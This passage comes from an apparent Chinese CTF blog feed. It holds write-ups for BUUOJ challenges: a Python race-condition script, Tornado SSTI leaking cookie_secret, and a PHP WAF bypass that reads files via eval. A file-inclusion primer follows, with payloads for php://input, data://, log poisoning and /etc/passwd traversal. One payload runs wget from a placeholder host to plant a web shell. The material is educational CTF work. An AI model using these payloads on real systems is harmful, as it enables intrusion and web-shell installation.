punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://55fcd3f8-b82d-422b-bf9a-8ed90d2aff73.node4.buuoj.cn:81/logout"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> newpassword<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'newpassword'</span><span class="token punctuation">:</span>newpassword    <span class="token punctuation">}</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://55fcd3f8-b82d-422b-bf9a-8ed90d2aff73.node4.buuoj.cn:81/change"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">func1</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    login<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'kb'</span><span class="token punctuation">,</span> <span class="token string">'123456'</span><span class="token punctuation">)</span>    change<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'kb'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">func2</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    logout<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    res <span class="token operator">=</span> login<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'123456'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'&lt;a href="/index">/index&lt;/a>'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'finish'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>        t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>func1<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>func2<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>第三种方法并没有复现成功，理论可行，完了如果有机会可以复现出来的话，再填这个坑。<br>参考：<br><a href="https://blog.csdn.net/rfrder/article/details/109188719">https://blog.csdn.net/rfrder/article/details/109188719</a><br><a href="https://www.anquanke.com/post/id/164086#h3-13">https://www.anquanke.com/post/id/164086#h3-13</a><br><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask session伪造 unicode欺骗 条件竞争 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>护网杯 2018 easy_tornado 1题解</title>
      <link href="/2022/01/24/%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%20easy_tornado%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/24/%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%20easy_tornado%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="护网杯-2018-easy-tornado-1题解"><a href="#护网杯-2018-easy-tornado-1题解" class="headerlink" title="护网杯 2018 easy_tornado 1题解"></a>护网杯 2018 easy_tornado 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="render函数"><a href="#render函数" class="headerlink" title="render函数"></a>render函数</h3><p>详情见：<a href="https://blog.csdn.net/qq78827534/article/details/80792514">render函数介绍</a><br>总结： </p><ol><li>render方法的实质就是生成template模板； </li><li>通过调用一个方法来生成，而这个方法是通过render方法的参数传递给它的； </li><li>这个方法有三个参数，分别提供标签名，标签相关属性，标签内部的html内容 </li><li>通过这三个参数，可以生成一个完整的木模板<br>备注：</li><li>render方法可以使用JSX语法，但需要Babel plugin插件；</li><li>render方法里的第三个参数可以使用函数来生成多个组件（特别是如果他们相同的话），只要生成结果是一个数组，且数组元素都是VNode即可；<h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2>首先打开题目环境 ，有三个目录<em><strong>/flag.txt</strong></em>，<em><strong>/welcome.txt</strong></em>，<em><strong>/hint.txt</strong></em>。<br>依次打开，得到<pre class=" language-1"><code class="language-1">/flag.txtflag in /fllllllllllllag/welcome.txtrender/hints.txtmd5(cookie_secret+md5(filename))</code></pre>同时发现网址里面有传参数filename和filehash，推测这里flag应该是<em><strong>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))<em><strong>里面。<br>filename已知为/fllllllllllllag，接下来目标是找cookie_secret。在welcome.txt中有提示render函数，又根据题目easy_tornado可推测是服务器模板注入。因为render是tornado里的函数，可以生成html模板。tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。和Python相关，和模板相关，就可以推测这可能是个ssti注入题了。<br>当我尝试把filename换成fllllllllllllag而不改动filehash时，弹出一个错误页面/error?msg=Error。<br>尝试将msg改为</strong></em>1<em><strong>，回显</strong></em>ORZ</strong></em>，猜测是被ban掉。改为***1***，回显1，证明是有ssti注入的。<br>查阅<a href="https://www.tornadoweb.org/en/latest/guide/templates.html#template-syntax">tornado官方文档</a><br>发现，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，而cookie_secret在RequestHandler.application.settings里，用handler.settings访问RequestHandler.application.settings。构造payload：<pre class=" language-1"><code class="language-1">http://98562ab7-bff6-412f-8cb0-91c379be2081.node4.buuoj.cn:81/error?msg={{handler.settings}}回显：{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '12cc2dc7-d62b-4574-a5cf-d70807a506c3'} </code></pre>求出filebash：eac1bfe012656f58801fbd9723f59cc0<br>构造payload<pre class=" language-1"><code class="language-1">http://98562ab7-bff6-412f-8cb0-91c379be2081.node4.buuoj.cn:81/file?filename=/fllllllllllllag&filehash=eac1bfe012656f58801fbd9723f59cc0回显：/fllllllllllllagflag{7baaa0ed-2fdb-4aab-acd1-1ee751db2b29}</code></pre>得到flag：flag{7baaa0ed-2fdb-4aab-acd1-1ee751db2b29}</li></ol><p>参考：<br><a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">https://blog.csdn.net/weixin_45642610/article/details/112519061</a><br><a href="https://www.tornadoweb.org/en/latest/guide/templates.html#template-syntax">https://www.tornadoweb.org/en/latest/guide/templates.html#template-syntax</a><br><a href="https://www.cnblogs.com/bwangel23/p/4858870.html">https://www.cnblogs.com/bwangel23/p/4858870.html</a><br><a href="https://blog.csdn.net/qq78827534/article/details/80792514">https://blog.csdn.net/qq78827534/article/details/80792514</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti注入 tornado </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF 2019 Easy Calc 1题解</title>
      <link href="/2022/01/21/RoarCTF%202019%20Easy%20Calc%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/21/RoarCTF%202019%20Easy%20Calc%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc-1题解"><a href="#RoarCTF-2019-Easy-Calc-1题解" class="headerlink" title="RoarCTF 2019 Easy Calc 1题解"></a>RoarCTF 2019 Easy Calc 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PHP字符串解析特性"><a href="#PHP字符串解析特性" class="headerlink" title="PHP字符串解析特性"></a>PHP字符串解析特性</h3><p>PHP会将查询字符串（在URL或正文中）转换为内部***$_GET<em><strong>或的关联数组</strong></em>$_POST***。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><pre class=" language-1"><code class="language-1">/news.php?%20news[id%00=42"+AND+1=0–</code></pre><p>上述PHP语句的参数%20news[id%00的值将存储到***$_GET[“news_id”]***中。<br>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>1.删除空白符<br>2.将某些字符转换为下划线（包括空格）<br>假如waf不允许num变量传递字母：</p><pre class=" language-1"><code class="language-1">http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</code></pre><p>那么我们可以在num前加个空格：</p><pre class=" language-1"><code class="language-1">http://www.xxx.com/index.php? num = aaaa</code></pre><p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>列出参数目录中的文件和目录</p><h3 id="利用chr绕过单引号"><a href="#利用chr绕过单引号" class="headerlink" title="利用chr绕过单引号"></a>利用chr绕过单引号</h3><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目发现输入框，查看源码发现</p><pre class=" language-php"><code class="language-php">$<span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        url<span class="token punctuation">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        type<span class="token punctuation">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>        success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>            $<span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>`<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert alert-success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span></span>答案<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span></span>$<span class="token punctuation">{</span>data<span class="token punctuation">}</span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>`<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        error<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>同时有提示***I’ve set up WAF to ensure security.***访问calc.php。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>发现单引号被ban掉，尝试构造</p><pre class=" language-1"><code class="language-1">?num=print_r(scandir(chr(47)));</code></pre><p>错误，联想到waf，利用空格绕过，构造</p><pre class=" language-1"><code class="language-1">? num=print_r(scandir(chr(47)));回显：Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1</code></pre><p>找到f1agg，构造</p><pre class=" language-1"><code class="language-1">? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></pre><p>得到flag: flag{afa9ab50-636d-450c-b42f-c92c1d96e8e1}<br>参考<br><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159108482119724843333506%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=159108482119724843333506&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-1-102630714.pc_insert_v2&amp;utm_term=%5BRoarCTF%202019%5DEasy%20Calc">php特性</a><br><a href="https://blog.csdn.net/weixin_45674567/article/details/106498395">https://blog.csdn.net/weixin_45674567/article/details/106498395</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP字符串解析特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020 新生赛 include1 题解</title>
      <link href="/2022/01/21/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%20include1%20%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/21/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%20include1%20%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="ACTF2020-新生赛-include1-题解"><a href="#ACTF2020-新生赛-include1-题解" class="headerlink" title="ACTF2020 新生赛 include1 题解"></a>ACTF2020 新生赛 include1 题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="典型特征"><a href="#典型特征" class="headerlink" title="典型特征"></a>典型特征</h4><p>典型特征<br>变量的值为一个页面：</p><pre class=" language-1"><code class="language-1">?page=a.php?home=b.html?file=content…</code></pre><p>转自大佬博客：<a href="https://blog.csdn.net/xg_ren/article/details/79040414">https://blog.csdn.net/xg_ren/article/details/79040414</a></p><h4 id="文件包含原理"><a href="#文件包含原理" class="headerlink" title="文件包含原理"></a>文件包含原理</h4><h5 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h5><p>开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含</p><h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><p>开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量，用来进行动态调用。正是这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p><h4 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h4><h5 id="文件本地包含"><a href="#文件本地包含" class="headerlink" title="文件本地包含"></a>文件本地包含</h5><p>包含服务器本身存在的恶意文件<br>a.txt:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>b.php:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>payload:</p><pre class=" language-1"><code class="language-1">http://xxxx/b.php/?id=a.txt</code></pre><p>注：<br>1.两个文件需在同一目录<br>2.被包含的页面后缀无论是什么都会被当做PHP解析</p><h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>包含其他网站上的恶意文件<br>payload:</p><pre class=" language-1"><code class="language-1">http://xxxx/b.php?id=http://xxxxx/文件路径</code></pre><p>注：<br>1.在php.ini中allow_url_fopen=on、allow_url_include=on<br>2.文件路径必须是绝对路径</p><h4 id="存在文件包含的脚本语言及应用函数"><a href="#存在文件包含的脚本语言及应用函数" class="headerlink" title="存在文件包含的脚本语言及应用函数"></a>存在文件包含的脚本语言及应用函数</h4><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>执行到<span class="token keyword">include</span>函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span>与<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>与上述函数一样，只是若文件中代码已经被包含则不会再次包含</code></pre><h5 id="jsp-servlet"><a href="#jsp-servlet" class="headerlink" title="jsp/servlet"></a>jsp/servlet</h5><pre class=" language-javascript"><code class="language-javascript">ava<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token function">filereader</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="各个协议实现命令执行"><a href="#各个协议实现命令执行" class="headerlink" title="各个协议实现命令执行"></a>各个协议实现命令执行</h4><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p>是否需要截断是根据包含函数后有没有对包含的文件进行拼接一个后缀，如果有就需要使用%00进行截断<br>当php版本&lt;=5.2使用%00截断</p><h5 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h5><p>用于访问本地文件系统<br>条件(php.ini)：</p><pre class=" language-1"><code class="language-1">allow_url_fopen   off/onallow_url_include off/on</code></pre><p>使用方法：file：//[文件的绝对路径和文件名]</p><h5 id="php-php伪协议"><a href="#php-php伪协议" class="headerlink" title="php://(php伪协议)"></a>php://(php伪协议)</h5><p>访问各个输入输出流<br>php://filter：用于读取源码并进行bash64编码输出；<br>条件（php.ini）：</p><pre class=" language-1"><code class="language-1">allow_url_fope   off/onallow_url_include off/on</code></pre><p>php://input：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；<br>条件(php.ini)：</p><pre class=" language-1"><code class="language-1">allow_url_fope   off/onallow_url_include on</code></pre><p>php://stdin是只读的，php://stdout 和 php://stderr 是只写的。<br>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。<br>php://fd 允许直接访问指定的文件描述符。</p><h5 id="zip-bzip-zlib"><a href="#zip-bzip-zlib" class="headerlink" title="zip://,bzip://,zlib://"></a>zip://,bzip://,zlib://</h5><p>均属于压缩流，可以访问压缩文件中的子文件，不需要传后缀名<br>条件：</p><pre class=" language-1"><code class="language-1">allow_url_fope   off/onallow_url_include off/on</code></pre><p>zip://使用方法：</p><pre class=" language-1"><code class="language-1">zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code></pre><p>bzip2://使用方法：</p><pre class=" language-1"><code class="language-1">bzip2://file.bz2</code></pre><p>zlib://使用方法：</p><pre class=" language-1"><code class="language-1">zlib://file.gz</code></pre><h5 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h5><p>条件：</p><pre class=" language-1"><code class="language-1">allow_url_fope   onallow_url_include on</code></pre><h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>数据流包装器</p><h4 id="文件包含利用场景"><a href="#文件包含利用场景" class="headerlink" title="文件包含利用场景"></a>文件包含利用场景</h4><h5 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h5><p>用户上传了一个可执行文件，通过文件包含那个文件实现漏洞利用</p><h5 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h5><p>php://input：用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。<br>条件：</p><pre class=" language-1"><code class="language-1">php <5.0 ，allow_url_include=Off 情况下也可以用php > 5.0，只有在allow_url_fopen=On 时才能使用</code></pre><p>例：</p><pre class=" language-1"><code class="language-1">http：//localhost/include/file.php?file=php://input     //URL<?php fputs(fopen("a.php","w"),"<?php phpinfo();?>")?>  //POST,创建一个文件a.php；并写入phpinfo</code></pre><p>data://：将原本的include的文件流重定向到了用户可控制的输入流中<br>条件：</p><pre class=" language-1"><code class="language-1">allow_url_include=Onphp > 5.2</code></pre><p>例：</p><pre class=" language-1"><code class="language-1">http://localhost/file.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==      //base64加密<？php system(whoami);？>；直接执行命令http://localhost/image.php?imagedata=data://image/jpeg;base64,..... // 后面加上图片木马；图片命令执行</code></pre><p>php://filter:这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过，例：</p><pre class=" language-1"><code class="language-1">http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=C:\oneword    //可以跟绝对路径也可以跟相对路径http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=[http|https|ftp]://www.bbb.com/2.txt   //远程路径</code></pre><h5 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h5><p>1、日志的默认路径</p><pre class=" language-1"><code class="language-1">/etc/httpd/logs/access_log或/var/log/httpd/access_log        //apache+linuxD:xamppapachelogsaccess.log或D:xamppapachelogserror.log  //apache_win2003C:WINDOWSsystem32Logfiles                     //iis6.0+win2003%SystemDrive%inetpublogsLogFiles            //iis7.0+win2003nginx 日志文件在用户安装目录的logs目录下</code></pre><p>2、web中间件默认配置uoh文件</p><pre class=" language-1"><code class="language-1">/etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd        //apache+linuxC:/Windows/system32/inetsrv/metabase.xml          //iis6.0+win2003C:WindowsSystem32inetsrvconfigapplicationHost.config           //iis7.0+win</code></pre><p>3、利用</p><pre class=" language-1"><code class="language-1">访问http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：http://localhost/include/file.php?file=../../apache/logs/access.log //（这里利用相对路径，找到日志文件，并以php解析的方式打开)</code></pre><h5 id="包含-proc-self-environ"><a href="#包含-proc-self-environ" class="headerlink" title="包含/proc/self/environ"></a>包含/proc/self/environ</h5><p>1、找文件包含漏洞</p><pre class=" language-1"><code class="language-1">www.aaa.com/view.php?page=../www.aaa.com/view.php?page=../../../../../etc/passwd</code></pre><p>2、检查proc/self/environ是否可以访问</p><pre class=" language-1"><code class="language-1">www.aaa.com/view.php?page=../../../../../proc/self/environ</code></pre><p>3、如果可读就注入代码</p><pre class=" language-1"><code class="language-1">访问：www.aaa.com/view.php?page=../../../../../proc/self/environ选择User-Agent 写代码如下：<?system('wget http://www.yourweb.com/oneword.txt -O shell.php');?>    //提交请求；我们的命令将被执行(将下载http://www.yourweb.com/oneword.txt，并将其保存为它在shell.php网站目录)，我们的shell也就被创建。如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器。</code></pre><p>4、访问shell</p><h5 id="包含session文件"><a href="#包含session文件" class="headerlink" title="包含session文件"></a>包含session文件</h5><p>?file=../../../../../../tmp/sess_1sv3pu01f97dp3qcfef8i2b9r2         //读取session文件</p><h4 id="常见的绕过"><a href="#常见的绕过" class="headerlink" title="常见的绕过"></a>常见的绕过</h4><h5 id="00截断（php-lt-5-3-4）"><a href="#00截断（php-lt-5-3-4）" class="headerlink" title="%00截断（php<5.3.4）"></a>%00截断（php&lt;5.3.4）</h5><p>说明：PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。</p><h5 id="超长字符截断"><a href="#超长字符截断" class="headerlink" title="超长字符截断"></a>超长字符截断</h5><p>利用：利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。而利用”./“的方式即可构造出超长目录字符串</p><h5 id="任意目录遍历"><a href="#任意目录遍历" class="headerlink" title="任意目录遍历"></a>任意目录遍历</h5><p>利用：使用”../../../“这样的方式来返回到上层目录中，这种方式又被称为”目录遍历(Path Traversal)”。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)</p><h5 id="问号截断"><a href="#问号截断" class="headerlink" title="问号截断"></a>问号截断</h5><p>利用：<a href="http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php">http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php</a>?</p><h2 id="做题详解"><a href="#做题详解" class="headerlink" title="做题详解"></a>做题详解</h2><p>打开题目环境，有tips，点进去</p><pre class=" language-1"><code class="language-1">回显：Can you find out the 